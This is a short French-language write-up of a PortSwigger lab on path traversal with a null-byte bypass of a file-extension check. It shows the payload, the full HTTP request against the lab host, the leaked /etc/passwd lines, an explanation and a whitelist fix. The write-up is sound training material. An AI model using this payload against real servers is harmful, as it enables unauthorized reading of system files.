# Challenge 1 : Path Traversal - Null Byte Bypass

**URL** : https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

## Payload

```
../.././etc/passwd%00.jpg
```

## Requete

```http
GET /image?filename=../.././etc/passwd%00.jpg HTTP/2
Host: 0aa700ce040716ad8097ad6d009d00b0.web-security-academy.net
Cookie: session=3ZHETfzHOKxMBlqDzeiPiga4b3Qre
```

## Resultat

Contenu de /etc/passwd recupere:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

## Explication

- `../..` remonte dans les dossiers
- `%00` null byte termine la chaine
- `.jpg` extension requise mais ignoree apres %00

## Correction

Utiliser whitelist de fichiers autorises.
